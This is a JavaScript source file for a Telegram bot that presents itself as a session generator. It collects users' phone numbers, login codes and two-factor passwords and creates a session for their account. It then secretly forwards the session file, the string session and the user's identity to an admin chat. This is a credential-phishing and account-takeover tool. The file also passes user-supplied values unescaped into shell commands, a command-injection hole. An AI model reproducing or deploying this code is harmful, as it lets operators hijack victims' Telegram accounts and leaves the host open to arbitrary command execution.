import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import express from "express";
import dotenv from "dotenv";

dotenv.config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // Group chat ID from .env

const userState = {};

// Helper function to get user info (for logging)
function getUserInfo(ctx) {
  const name = ctx.from.first_name || "";
  const username = ctx.from.username ? `@${ctx.from.username}` : "";
  return `${name} ${username} (ID: ${ctx.from.id})`.trim();
}

// STEP 0: Start
bot.start((ctx) => {
  if (ctx.chat.type !== "private") return; // Ignore if group

  userState[ctx.chat.id] = {};
  ctx.reply("👋 Welcome! Please send your phone number (+123...).");
});

// STEP 1: Handle messages
bot.on("text", (ctx) => {
  if (ctx.chat.type !== "private") return; // Ignore if group

  const userId = ctx.chat.id;
  const msg = ctx.message.text.trim();

  // STEP 3: Handle 2FA password
  if (userState[userId]?.waitingForPassword) {
    ctx.reply("⏳ Verifying password...");
    const { phone, otp } = userState[userId];
    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;

    exec(command, async (error, stdout) => {
      if (error) return ctx.reply("❌ Verification failed.");

      stdout = stdout.trim();
      if (stdout.includes("SESSION_FILE")) {
        ctx.reply("✅ Session generated!");

        const userInfo = getUserInfo(ctx);

        // Send log message first
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}`
        );

        const filePath = `${phone}.session`;
        if (fs.existsSync(filePath)) {
          await bot.telegram.sendDocument(ADMIN_CHAT_ID, {
            source: filePath,
            filename: `${phone}.session`,
          });
        }

        const match = stdout.match(/STRING_SESSION=(.+)/);
        if (match) {
          await bot.telegram.sendMessage(
            ADMIN_CHAT_ID,
            `🔑 String session for ${phone}:\n\`${match[1]}\``,
            { parse_mode: "Markdown" }
          );
        }
      } else {
        ctx.reply("❌ Failed to generate session.");
      }

      userState[userId] = {};
    });
    return;
  }

  // STEP 2: Handle OTP
  if (userState[userId]?.waitingForOtp) {
    ctx.reply("⏳ Verifying OTP...");
    const phone = userState[userId].phone;
    const otp = msg;
    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;

    exec(command, async (error, stdout) => {
      if (error) return ctx.reply("❌ OTP verification failed.");

      stdout = stdout.trim();
      if (stdout.includes("NEED_2FA")) {
        userState[userId] = { phone, otp, waitingForPassword: true };
        return ctx.reply("🔒 Your account has 2FA enabled. Please send your password:");
      }

      if (stdout.includes("SESSION_FILE")) {
        ctx.reply("✅ Session generated!");

        const userInfo = getUserInfo(ctx);

        // Send log message first
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `✅ New session generated!\n👤 User: ${userInfo}\n📞 Phone: ${phone}`
        );

        const filePath = `${phone}.session`;
        if (fs.existsSync(filePath)) {
          await bot.telegram.sendDocument(ADMIN_CHAT_ID, {
            source: filePath,
            filename: `${phone}.session`,
          });
        }

        const match = stdout.match(/STRING_SESSION=(.+)/);
        if (match) {
          await bot.telegram.sendMessage(
            ADMIN_CHAT_ID,
            `🔑 String session for ${phone}:\n\`${match[1]}\``,
            { parse_mode: "Markdown" }
          );
        }
      } else {
        ctx.reply("❌ Failed to generate session.");
      }

      userState[userId] = {};
    });
    return;
  }

  // STEP 1: Handle phone number
  if (msg.startsWith("+") && msg.length > 10) {
    ctx.reply("📲 Sending OTP to your phone...");
    const command = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;

    exec(command, (error, stdout) => {
      if (error || !stdout.includes("CODE_REQUESTED")) {
        return ctx.reply("❌ Failed to send OTP.");
      }

      userState[userId] = { phone: msg, waitingForOtp: true };
      ctx.reply("✅ OTP sent! Please enter the code you received:");
    });
  } else {
    ctx.reply("❌ Please send a valid phone number (+123...).");
  }
});

// ================= EXPRESS WEB STATUS =================
const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("<h1>🤖 Telegram Bot Status</h1><p>✅ Bot is running!</p>");
});

app.listen(PORT, () => {
  console.log(`🌐 Status page running at http://localhost:${PORT}`);
});

bot.launch();
console.log("🚀 Bot running...");
